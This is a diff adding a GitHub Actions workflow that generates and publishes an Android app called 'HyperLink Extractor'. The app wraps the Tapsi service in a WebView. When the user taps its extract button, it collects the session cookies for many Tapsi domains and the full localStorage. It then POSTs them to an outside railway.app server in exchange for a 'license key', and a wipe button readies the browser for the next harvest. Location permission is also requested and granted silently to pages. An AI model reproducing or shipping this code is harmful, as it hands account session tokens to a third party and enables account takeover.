@@ -1,0 +1,880 @@
+name: Build HyperLink APK
+
+on:
+  push:
+    branches: [ "*" ]
+  pull_request:
+    branches: [ "*" ]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  build-android-apk:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Set up Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Set up Gradle
+        uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: '8.7'
+
+      - name: Generate Android Studio Project Files
+        shell: bash
+        run: |
+          mkdir -p app/src/main/java/ir/hyperlink/extractor
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/res/values
+
+          cat << 'EOF' > settings.gradle
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "HyperLinkExtractor"
+          include ':app'
+          EOF
+
+          cat << 'EOF' > build.gradle
+          plugins {
+              id 'com.android.application' version '8.3.2' apply false
+          }
+          EOF
+
+          cat << 'EOF' > gradle.properties
+          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          android.useAndroidX=false
+          EOF
+
+          cat << 'EOF' > app/build.gradle
+          plugins {
+              id 'com.android.application'
+          }
+
+          android {
+              namespace 'ir.hyperlink.extractor'
+              compileSdk 34
+
+              defaultConfig {
+                  applicationId "ir.hyperlink.extractor"
+                  minSdk 23
+                  targetSdk 34
+                  versionCode 12
+                  versionName "1.2"
+              }
+
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                      signingConfig signingConfigs.debug
+                  }
+                  debug {
+                      applicationIdSuffix ""
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+
+          dependencies {
+          }
+          EOF
+
+          cat << 'EOF' > app/src/main/res/drawable/ic_launcher.xml
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="108dp"
+              android:height="108dp"
+              android:viewportWidth="108"
+              android:viewportHeight="108">
+              <path
+                  android:fillColor="#121C29"
+                  android:pathData="M0,0h108v108h-108z"/>
+              <path
+                  android:fillColor="#5CEBFF"
+                  android:pathData="M60,22L32,60h20l-6,26l30,-38H56z"/>
+          </vector>
+          EOF
+
+          cat << 'EOF' > app/src/main/res/values/strings.xml
+          <resources>
+              <string name="app_name">HyperLink</string>
+          </resources>
+          EOF
+
+          cat << 'EOF' > app/src/main/AndroidManifest.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+              <application
+                  android:allowBackup="true"
+                  android:icon="@drawable/ic_launcher"
+                  android:label="@string/app_name"
+                  android:supportsRtl="true"
+                  android:usesCleartextTraffic="true"
+                  android:theme="@android:style/Theme.Material.NoActionBar">
+
+                  <activity
+                      android:name=".MainActivity"
+                      android:configChanges="orientation|screenSize|keyboardHidden"
+                      android:exported="true"
+                      android:windowSoftInputMode="adjustResize">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+              </application>
+
+          </manifest>
+          EOF
+
+          cat << 'EOF' > app/src/main/java/ir/hyperlink/extractor/MainActivity.java
+          package ir.hyperlink.extractor;
+
+          import android.Manifest;
+          import android.annotation.SuppressLint;
+          import android.app.Activity;
+          import android.content.ClipData;
+          import android.content.ClipboardManager;
+          import android.content.Context;
+          import android.content.pm.PackageManager;
+          import android.graphics.Bitmap;
+          import android.graphics.Color;
+          import android.graphics.Typeface;
+          import android.graphics.drawable.GradientDrawable;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.text.Html;
+          import android.util.TypedValue;
+          import android.view.Gravity;
+          import android.view.View;
+          import android.view.ViewGroup;
+          import android.view.Window;
+          import android.webkit.CookieManager;
+          import android.webkit.GeolocationPermissions;
+          import android.webkit.WebChromeClient;
+          import android.webkit.WebResourceRequest;
+          import android.webkit.WebSettings;
+          import android.webkit.WebStorage;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+          import android.widget.Button;
+          import android.widget.LinearLayout;
+          import android.widget.ProgressBar;
+          import android.widget.ScrollView;
+          import android.widget.TextView;
+          import android.widget.Toast;
+
+          import org.json.JSONObject;
+          import org.json.JSONTokener;
+
+          import java.io.BufferedReader;
+          import java.io.InputStream;
+          import java.io.InputStreamReader;
+          import java.io.OutputStream;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.nio.charset.StandardCharsets;
+          import java.util.Iterator;
+          import java.util.LinkedHashMap;
+          import java.util.Map;
+
+          public class MainActivity extends Activity {
+
+              private static final String TAPSI_START_URL = "https://app.tapsi.cab";
+              private static final String API_URL = "https://testtok-production1.up.railway.app/api/tapsi/create-license";
+
+              private WebView webView;
+              private ProgressBar progressBar;
+              private LinearLayout controlPanelBody;
+              private Button togglePanelBtn;
+              private Button extractBtn;
+              private Button copyBtn;
+              private Button copyLicenseBtn;
+              private Button cleanBtn;
+              private TextView statusDiv;
+
+              private JSONObject extractedDataCache = null;
+              private String lastLicenseKey = null;
+              private final Map<String, String> sessionLocalStorageCache = new LinkedHashMap<>();
+              private boolean isPanelExpanded = true;
+              private final Handler mainHandler = new Handler(Looper.getMainLooper());
+
+              @SuppressLint("SetJavaScriptEnabled")
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  requestWindowFeature(Window.FEATURE_NO_TITLE);
+
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                      getWindow().setStatusBarColor(Color.parseColor("#121C29"));
+                  }
+
+                  requestLocationPermissionsIfNeeded();
+
+                  LinearLayout root = new LinearLayout(this);
+                  root.setOrientation(LinearLayout.VERTICAL);
+                  root.setBackgroundColor(Color.parseColor("#121C29"));
+                  root.setLayoutDirection(View.LAYOUT_DIRECTION_RTL);
+
+                  // 1. نوار بالا (هدر + دکمه جمع/باز کردن پنل + صفحه اصلی)
+                  LinearLayout topBar = new LinearLayout(this);
+                  topBar.setOrientation(LinearLayout.HORIZONTAL);
+                  topBar.setGravity(Gravity.CENTER_VERTICAL);
+                  topBar.setBackgroundColor(Color.parseColor("#121C29"));
+                  int pad12 = dp(12);
+                  topBar.setPadding(pad12, dp(10), pad12, dp(10));
+
+                  TextView titleView = new TextView(this);
+                  titleView.setText("HyperLink Extractor ⚡️");
+                  titleView.setTextColor(Color.parseColor("#5CEBFF"));
+                  titleView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
+                  titleView.setTypeface(Typeface.DEFAULT_BOLD);
+                  LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
+                          0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
+                  titleView.setLayoutParams(titleParams);
+
+                  Button homeBtn = createSmallActionButton("🏠 تپسی", "#1F2833", "#AAB9C8");
+                  homeBtn.setOnClickListener(v -> webView.loadUrl(TAPSI_START_URL));
+
+                  LinearLayout.LayoutParams smallBtnMargin = new LinearLayout.LayoutParams(
+                          ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+                  smallBtnMargin.setMargins(dp(6), 0, dp(6), 0);
+
+                  togglePanelBtn = createSmallActionButton("🔼 بستن پنل", "#1F2833", "#5CEBFF");
+                  togglePanelBtn.setLayoutParams(smallBtnMargin);
+                  togglePanelBtn.setOnClickListener(v -> togglePanel());
+
+                  topBar.addView(titleView);
+                  topBar.addView(homeBtn);
+                  topBar.addView(togglePanelBtn);
+                  root.addView(topBar);
+
+                  // 2. بدنه پنل ابزار (مطابق popup.html)
+                  ScrollView panelScroll = new ScrollView(this);
+                  panelScroll.setBackgroundColor(Color.parseColor("#121C29"));
+                  LinearLayout.LayoutParams scrollParams = new LinearLayout.LayoutParams(
+                          ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+                  panelScroll.setLayoutParams(scrollParams);
+
+                  controlPanelBody = new LinearLayout(this);
+                  controlPanelBody.setOrientation(LinearLayout.VERTICAL);
+                  controlPanelBody.setGravity(Gravity.CENTER_HORIZONTAL);
+                  controlPanelBody.setPadding(dp(15), dp(4), dp(15), dp(12));
+
+                  TextView guideView = new TextView(this);
+                  guideView.setText(fromHtml("ابتدا در سایت تپسی روی <b>سوپرمارکت</b> کلیک کنید تا لود شود، سپس دکمه استخراج را بزنید."));
+                  guideView.setTextColor(Color.parseColor("#AAB9C8"));
+                  guideView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
+                  guideView.setGravity(Gravity.CENTER);
+                  guideView.setPadding(0, 0, 0, dp(8));
+                  controlPanelBody.addView(guideView);
+
+                  // دکمه استخراج و ساخت لایسنس
+                  extractBtn = createStyledButton(
+                          "استخراج و ساخت لایسنس",
+                          "#5CEBFF",
+                          "#002B31",
+                          null
+                  );
+                  extractBtn.setOnClickListener(v -> extractAndCreateLicense());
+                  controlPanelBody.addView(extractBtn);
+
+                  // دکمه کپی کلید لایسنس
+                  copyLicenseBtn = createStyledButton(
+                          "🔑 کپی کلید لایسنس",
+                          "#1F2833",
+                          "#00E676",
+                          "#00E676"
+                  );
+                  copyLicenseBtn.setVisibility(View.GONE);
+                  copyLicenseBtn.setOnClickListener(v -> copyLicenseKey());
+                  controlPanelBody.addView(copyLicenseBtn);
+
+                  // دکمه کپی اطلاعات استخراج شده
+                  copyBtn = createStyledButton(
+                          "📋 کپی اطلاعات استخراج شده",
+                          "#1F2833",
+                          "#5CEBFF",
+                          "#5CEBFF"
+                  );
+                  copyBtn.setVisibility(View.GONE);
+                  copyBtn.setOnClickListener(v -> copyExtractedData());
+                  controlPanelBody.addView(copyBtn);
+
+                  // دکمه آماده‌سازی برای لایسنس بعدی
+                  cleanBtn = createStyledButton(
+                          "🔄 آماده‌سازی برای لایسنس بعدی",
+                          "#2A211B",
+                          "#FF9800",
+                          "#FF9800"
+                  );
+                  cleanBtn.setOnClickListener(v -> performDeepClean());
+                  controlPanelBody.addView(cleanBtn);
+
+                  // وضعیت
+                  statusDiv = new TextView(this);
+                  statusDiv.setText("وضعیت: آماده به کار");
+                  statusDiv.setTextColor(Color.parseColor("#AAB9C8"));
+                  statusDiv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
+                  statusDiv.setGravity(Gravity.CENTER);
+                  statusDiv.setTextIsSelectable(true);
+                  statusDiv.setPadding(0, dp(10), 0, dp(4));
+                  controlPanelBody.addView(statusDiv);
+
+                  panelScroll.addView(controlPanelBody);
+                  root.addView(panelScroll);
+
+                  // نوار پیشرفت لود صفحه
+                  progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
+                  progressBar.setMax(100);
+                  progressBar.setLayoutParams(new LinearLayout.LayoutParams(
+                          ViewGroup.LayoutParams.MATCH_PARENT, dp(3)));
+                  root.addView(progressBar);
+
+                  // 3. مرورگر داخلی WebView برای سایت تپسی
+                  webView = new WebView(this);
+                  LinearLayout.LayoutParams webParams = new LinearLayout.LayoutParams(
+                          ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f);
+                  webView.setLayoutParams(webParams);
+                  setupWebView();
+                  root.addView(webView);
+
+                  setContentView(root);
+                  webView.loadUrl(TAPSI_START_URL);
+              }
+
+              @SuppressLint("SetJavaScriptEnabled")
+              private void setupWebView() {
+                  WebSettings settings = webView.getSettings();
+                  settings.setJavaScriptEnabled(true);
+                  settings.setDomStorageEnabled(true);
+                  settings.setDatabaseEnabled(true);
+                  settings.setGeolocationEnabled(true);
+                  settings.setLoadWithOverviewMode(true);
+                  settings.setUseWideViewPort(true);
+                  settings.setJavaScriptCanOpenWindowsAutomatically(true);
+                  settings.setSupportMultipleWindows(false);
+                  settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+
+                  String defaultUa = settings.getUserAgentString();
+                  if (defaultUa != null) {
+                      settings.setUserAgentString(defaultUa.replace("; wv", ""));
+                  }
+
+                  CookieManager cookieManager = CookieManager.getInstance();
+                  cookieManager.setAcceptCookie(true);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                      cookieManager.setAcceptThirdPartyCookies(webView, true);
+                  }
+
+                  webView.setWebChromeClient(new WebChromeClient() {
+                      @Override
+                      public void onProgressChanged(WebView view, int newProgress) {
+                          if (newProgress < 100) {
+                              progressBar.setVisibility(View.VISIBLE);
+                              progressBar.setProgress(newProgress);
+                          } else {
+                              progressBar.setVisibility(View.GONE);
+                          }
+                      }
+
+                      @Override
+                      public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
+                          callback.invoke(origin, true, false);
+                      }
+                  });
+
+                  webView.setWebViewClient(new WebViewClient() {
+                      @Override
+                      public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
+                          String url = request.getUrl().toString();
+                          if (url.startsWith("http://") || url.startsWith("https://")) {
+                              return false;
+                          }
+                          return true;
+                      }
+
+                      @Override
+                      public void onPageStarted(WebView view, String url, Bitmap favicon) {
+                          super.onPageStarted(view, url, favicon);
+                          injectPopupRedirectHelper();
+                      }
+
+                      @Override
+                      public void onPageFinished(WebView view, String url) {
+                          super.onPageFinished(view, url);
+                          CookieManager.getInstance().flush();
+                          injectPopupRedirectHelper();
+                          captureCurrentLocalStorage();
+                      }
+                  });
+              }
+
+              private void injectPopupRedirectHelper() {
+                  webView.evaluateJavascript(
+                          "(function() {" +
+                          "  window.open = function(url) { if (url) { window.location.href = url; } return window; };" +
+                          "  document.addEventListener('click', function(e) {" +
+                          "    var a = e.target && e.target.closest ? e.target.closest('a[target=\"_blank\"]') : null;" +
+                          "    if (a && a.href) { a.removeAttribute('target'); }" +
+                          "  }, true);" +
+                          "})();",
+                          null
+                  );
+              }
+
+              private void captureCurrentLocalStorage() {
+                  webView.evaluateJavascript(
+                          "(function() { try { return JSON.stringify(window.localStorage); } catch(e) { return '{}'; } })();",
+                          value -> {
+                              try {
+                                  String rawJson = unwrapJsString(value);
+                                  if (rawJson != null && rawJson.startsWith("{")) {
+                                      JSONObject obj = new JSONObject(rawJson);
+                                      Iterator<String> keys = obj.keys();
+                                      while (keys.hasNext()) {
+                                          String k = keys.next();
+                                          sessionLocalStorageCache.put(k, obj.optString(k, ""));
+                                      }
+                                  }
+                              } catch (Exception ignored) {
+                              }
+                          }
+                  );
+              }
+
+              // ==========================================
+              // 1. استخراج و ساخت لایسنس
+              // ==========================================
+              private void extractAndCreateLicense() {
+                  setStatus("⏳ در حال بررسی و استخراج...", "#FFC400", false);
+                  copyBtn.setVisibility(View.GONE);
+                  copyLicenseBtn.setVisibility(View.GONE);
+                  extractedDataCache = null;
+                  lastLicenseKey = null;
+
+                  String currentUrl = webView.getUrl() != null ? webView.getUrl() : "";
+                  if (currentUrl.isEmpty()) {
+                      setStatus("❌ خطا: صفحه شناسایی نشد. لطفاً صفحه را رفرش کنید.", "#FFB4AB", false);
+                      return;
+                  }
+
+                  if (!currentUrl.contains("tapsi.cab") && !currentUrl.contains("tapsi.ir") && !currentUrl.contains("tapsi.markets")) {
+                      setStatus("❌ خطا: لطفاً ابتدا وارد سایت تپسی شوید.", "#FFB4AB", false);
+                      return;
+                  }
+
+                  CookieManager cookieManager = CookieManager.getInstance();
+                  cookieManager.flush();
+
+                  String[] cabUrls = new String[]{
+                          "https://tapsi.cab",
+                          "https://app.tapsi.cab",
+                          "https://api.tapsi.cab",
+                          "https://accounts.tapsi.cab"
+                  };
+                  String[] irUrls = new String[]{
+                          "https://tapsi.ir",
+                          "https://www.tapsi.ir",
+                          "https://market.tapsi.ir",
+                          "https://supermarket.tapsi.ir",
+                          "https://api.tapsi.ir",
+                          "https://tapsi.markets",
+                          "https://app.tapsi.markets"
+                  };
+
+                  Map<String, String> cabCookies = collectCookiesForUrls(cookieManager, cabUrls);
+                  Map<String, String> irCookies = collectCookiesForUrls(cookieManager, irUrls);
+
+                  if (currentUrl.contains("tapsi.ir") || currentUrl.contains("tapsi.markets")) {
+                      Map<String, String> currentCookies = collectCookiesForUrls(cookieManager, new String[]{currentUrl});
+                      irCookies.putAll(currentCookies);
+                  } else if (currentUrl.contains("tapsi.cab")) {
+                      Map<String, String> currentCookies = collectCookiesForUrls(cookieManager, new String[]{currentUrl});
+                      cabCookies.putAll(currentCookies);
+                  }
+
+                  if (irCookies.isEmpty()) {
+                      setStatus(
+                              "❌ <b>اطلاعات ناقص است!</b><br><br>شما هنوز وارد مارکت نشده‌اید.<br>لطفاً در سایت تپسی روی آیکون <b>سوپرمارکت</b> کلیک کنید تا مارکت باز شود، سپس دوباره این دکمه را بزنید.",
+                              "#FFB4AB",
+                              true
+                      );
+                      return;
+                  }
+
+                  Map<String, String> allCookies = new LinkedHashMap<>();
+                  allCookies.putAll(cabCookies);
+                  allCookies.putAll(irCookies);
+
+                  StringBuilder cookieBuilder = new StringBuilder();
+                  for (Map.Entry<String, String> entry : allCookies.entrySet()) {
+                      if (cookieBuilder.length() > 0) {
+                          cookieBuilder.append("; ");
+                      }
+                      cookieBuilder.append(entry.getKey()).append("=").append(entry.getValue());
+                  }
+                  final String cookieString = cookieBuilder.toString();
+
+                  webView.evaluateJavascript(
+                          "(function() { try { return JSON.stringify(window.localStorage); } catch(e) { return '{}'; } })();",
+                          value -> {
+                              try {
+                                  JSONObject mergedStorage = new JSONObject();
+                                  for (Map.Entry<String, String> entry : sessionLocalStorageCache.entrySet()) {
+                                      mergedStorage.put(entry.getKey(), entry.getValue());
+                                  }
+
+                                  String currentLsRaw = unwrapJsString(value);
+                                  if (currentLsRaw != null && currentLsRaw.startsWith("{")) {
+                                      JSONObject currentLsObj = new JSONObject(currentLsRaw);
+                                      Iterator<String> keys = currentLsObj.keys();
+                                      while (keys.hasNext()) {
+                                          String k = keys.next();
+                                          String v = currentLsObj.optString(k, "");
+                                          mergedStorage.put(k, v);
+                                          sessionLocalStorageCache.put(k, v);
+                                      }
+                                  }
+
+                                  String localStorageData = mergedStorage.toString();
+
+                                  extractedDataCache = new JSONObject();
+                                  extractedDataCache.put("cookies", cookieString.isEmpty() ? "empty" : cookieString);
+                                  extractedDataCache.put("local_storage", localStorageData.isEmpty() ? "{}" : localStorageData);
+                                  extractedDataCache.put("phone_number", "unknown");
+
+                                  copyBtn.setVisibility(View.VISIBLE);
+                                  setStatus("⏳ در حال صدور لایسنس...", "#FFC400", false);
+
+                                  sendLicenseRequest(extractedDataCache.toString());
+
+                              } catch (Exception err) {
+                                  setStatus("❌ خطای سیستمی: " + err.getMessage(), "#FFB4AB", false);
+                              }
+                          }
+                  );
+              }
+
+              private void sendLicenseRequest(final String jsonBody) {
+                  new Thread(() -> {
+                      HttpURLConnection conn = null;
+                      try {
+                          URL url = new URL(API_URL);
+                          conn = (HttpURLConnection) url.openConnection();
+                          conn.setRequestMethod("POST");
+                          conn.setConnectTimeout(20000);
+                          conn.setReadTimeout(20000);
+                          conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                          conn.setRequestProperty("Accept", "application/json");
+                          conn.setDoOutput(true);
+
+                          byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
+                          try (OutputStream os = conn.getOutputStream()) {
+                              os.write(input, 0, input.length);
+                          }
+
+                          int code = conn.getResponseCode();
+                          InputStream is = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
+                          StringBuilder responseText = new StringBuilder();
+                          if (is != null) {
+                              try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
+                                  String line;
+                                  while ((line = br.readLine()) != null) {
+                                      responseText.append(line);
+                                  }
+                              }
+                          }
+
+                          JSONObject data = new JSONObject(responseText.toString());
+                          final boolean isOk = (code >= 200 && code < 300) && data.optBoolean("success", false);
+
+                          mainHandler.post(() -> {
+                              if (isOk) {
+                                  lastLicenseKey = data.optString("license_key", "");
+                                  copyLicenseBtn.setVisibility(View.VISIBLE);
+                                  setStatus(
+                                          "✅ موفق!<br><br>لایسنس شما:<br><b style=\"color:#5CEBFF;\">" + lastLicenseKey + "</b>",
+                                          "#00E676",
+                                          true
+                                  );
+                              } else {
+                                  String detail = data.optString("detail", "نامشخص");
+                                  setStatus("❌ خطا از سمت سرور: " + detail, "#FFB4AB", false);
+                              }
+                          });
+
+                      } catch (Exception err) {
+                          mainHandler.post(() ->
+                                  setStatus("❌ خطای سیستمی: " + err.getMessage(), "#FFB4AB", false)
+                          );
+                      } finally {
+                          if (conn != null) {
+                              conn.disconnect();
+                          }
+                      }
+                  }).start();
+              }
+
+              // ==========================================
+              // 2. کپی اطلاعات استخراج شده و کلید لایسنس
+              // ==========================================
+              private void copyExtractedData() {
+                  if (extractedDataCache != null) {
+                      try {
+                          String textToCopy = extractedDataCache.toString(2);
+                          ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+                          ClipData clip = ClipData.newPlainText("HyperLink Extracted Data", textToCopy);
+                          clipboard.setPrimaryClip(clip);
+
+                          final CharSequence previousText = statusDiv.getText();
+                          final int previousColor = statusDiv.getCurrentTextColor();
+
+                          setStatus("✅ اطلاعات خام با موفقیت کپی شد!", "#00FF7F", false);
+
+                          mainHandler.postDelayed(() -> {
+                              statusDiv.setText(previousText);
+                              statusDiv.setTextColor(previousColor);
+                          }, 2500);
+                      } catch (Exception err) {
+                          Toast.makeText(this, "❌ خطا در کپی کردن: " + err.getMessage(), Toast.LENGTH_SHORT).show();
+                      }
+                  }
+              }
+
+              private void copyLicenseKey() {
+                  if (lastLicenseKey != null && !lastLicenseKey.isEmpty()) {
+                      ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+                      ClipData clip = ClipData.newPlainText("HyperLink License Key", lastLicenseKey);
+                      clipboard.setPrimaryClip(clip);
+                      Toast.makeText(this, "✅ کلید لایسنس کپی شد!", Toast.LENGTH_SHORT).show();
+                  }
+              }
+
+              // ==========================================
+              // 3. پاک‌سازی عمیق (Deep Clean)
+              // ==========================================
+              private void performDeepClean() {
+                  setStatus("🧹 در حال پاک‌سازی عمیق مرورگر...", "#FFC400", false);
+
+                  try {
+                      sessionLocalStorageCache.clear();
+                      extractedDataCache = null;
+                      lastLicenseKey = null;
+                      copyBtn.setVisibility(View.GONE);
+                      copyLicenseBtn.setVisibility(View.GONE);
+
+                      webView.evaluateJavascript(
+                              "(function() { try { window.localStorage.clear(); window.sessionStorage.clear(); } catch(e) {} })();",
+                              null
+                      );
+
+                      WebStorage.getInstance().deleteAllData();
+
+                      CookieManager cookieManager = CookieManager.getInstance();
+                      cookieManager.removeAllCookies(value -> {
+                          cookieManager.flush();
+                          webView.clearCache(true);
+                          webView.clearFormData();
+                          webView.clearHistory();
+                          webView.loadUrl(TAPSI_START_URL);
+
+                          setStatus("✅ پاک‌سازی کامل شد!<br>صفحه در حال رفرش است...", "#00E676", true);
+                      });
+
+                  } catch (Exception err) {
+                      setStatus("❌ خطا در پاک‌سازی: " + err.getMessage(), "#FFB4AB", false);
+                  }
+              }
+
+              // ==========================================
+              // توابع کمکی
+              // ==========================================
+              private Map<String, String> collectCookiesForUrls(CookieManager cm, String[] urls) {
+                  Map<String, String> map = new LinkedHashMap<>();
+                  for (String u : urls) {
+                      String raw = cm.getCookie(u);
+                      if (raw != null && !raw.trim().isEmpty()) {
+                          String[] pairs = raw.split(";");
+                          for (String pair : pairs) {
+                              String trimmed = pair.trim();
+                              int idx = trimmed.indexOf('=');
+                              if (idx > 0) {
+                                  String k = trimmed.substring(0, idx).trim();
+                                  String v = trimmed.substring(idx + 1).trim();
+                                  map.put(k, v);
+                              }
+                          }
+                      }
+                  }
+                  return map;
+              }
+
+              private String unwrapJsString(String value) {
+                  if (value == null || "null".equals(value)) {
+                      return "{}";
+                  }
+                  try {
+                      Object tok = new JSONTokener(value).nextValue();
+                      return tok != null ? tok.toString() : "{}";
+                  } catch (Exception e) {
+                      return "{}";
+                  }
+              }
+
+              private void togglePanel() {
+                  isPanelExpanded = !isPanelExpanded;
+                  if (isPanelExpanded) {
+                      controlPanelBody.setVisibility(View.VISIBLE);
+                      togglePanelBtn.setText("🔼 بستن پنل");
+                  } else {
+                      controlPanelBody.setVisibility(View.GONE);
+                      togglePanelBtn.setText("🔽 باز کردن پنل");
+                  }
+              }
+
+              private void setStatus(String text, String colorHex, boolean isHtml) {
+                  if (isHtml) {
+                      statusDiv.setText(fromHtml(text));
+                  } else {
+                      statusDiv.setText(text);
+                  }
+                  statusDiv.setTextColor(Color.parseColor(colorHex));
+              }
+
+              @SuppressWarnings("deprecation")
+              private CharSequence fromHtml(String html) {
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                      return Html.fromHtml(html, Html.FROM_HTML_MODE_LEGACY);
+                  }
+                  return Html.fromHtml(html);
+              }
+
+              private Button createStyledButton(String text, String bgHex, String textHex, String strokeHex) {
+                  Button btn = new Button(this);
+                  btn.setText(text);
+                  btn.setAllCaps(false);
+                  btn.setTextColor(Color.parseColor(textHex));
+                  btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
+                  btn.setTypeface(Typeface.DEFAULT_BOLD);
+
+                  GradientDrawable bg = new GradientDrawable();
+                  bg.setColor(Color.parseColor(bgHex));
+                  bg.setCornerRadius(dp(8));
+                  if (strokeHex != null) {
+                      bg.setStroke(dp(1), Color.parseColor(strokeHex));
+                  }
+                  btn.setBackground(bg);
+
+                  LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
+                          ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+                  params.setMargins(0, dp(8), 0, 0);
+                  btn.setLayoutParams(params);
+                  btn.setPadding(dp(14), dp(10), dp(14), dp(10));
+                  return btn;
+              }
+
+              private Button createSmallActionButton(String text, String bgHex, String textHex) {
+                  Button btn = new Button(this);
+                  btn.setText(text);
+                  btn.setAllCaps(false);
+                  btn.setTextColor(Color.parseColor(textHex));
+                  btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
+
+                  GradientDrawable bg = new GradientDrawable();
+                  bg.setColor(Color.parseColor(bgHex));
+                  bg.setCornerRadius(dp(6));
+                  bg.setStroke(dp(1), Color.parseColor(textHex));
+                  btn.setBackground(bg);
+                  btn.setPadding(dp(10), dp(4), dp(10), dp(4));
+                  btn.setMinHeight(0);
+                  btn.setMinimumHeight(0);
+                  return btn;
+              }
+
+              private int dp(int value) {
+                  return (int) TypedValue.applyDimension(
+                          TypedValue.COMPLEX_UNIT_DIP,
+                          value,
+                          getResources().getDisplayMetrics()
+                  );
+              }
+
+              private void requestLocationPermissionsIfNeeded() {
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                      if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                          requestPermissions(new String[]{
+                                  Manifest.permission.ACCESS_FINE_LOCATION,
+                                  Manifest.permission.ACCESS_COARSE_LOCATION
+                          }, 1001);
+                      }
+                  }
+              }
+
+              @Override
+              public void onBackPressed() {
+                  if (webView != null && webView.canGoBack()) {
+                      webView.goBack();
+                  } else {
+                      super.onBackPressed();
+                  }
+              }
+          }
+          EOF
+
+      - name: Build Debug APK with Gradle
+        run: |
+          gradle assembleDebug --no-daemon
+
+      - name: Prepare Output APK
+        run: |
+          cp app/build/outputs/apk/debug/app-debug.apk HyperLink-Extractor-v1.2.apk
+
+      - name: Upload APK to Artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: HyperLink-Extractor-APK
+          path: HyperLink-Extractor-v1.2.apk
+
+      - name: Create GitHub Release (Optional Direct Download)
+        uses: softprops/action-gh-release@v2
+        if: github.event_name == 'push' || github.event_name == 'workflow_dispatch'
+        continue-on-error: true
+        with:
+          tag_name: v1.2.${{ github.run_number }}
+          name: "HyperLink Extractor APK (Build #${{ github.run_number }})"
+          files: HyperLink-Extractor-v1.2.apk
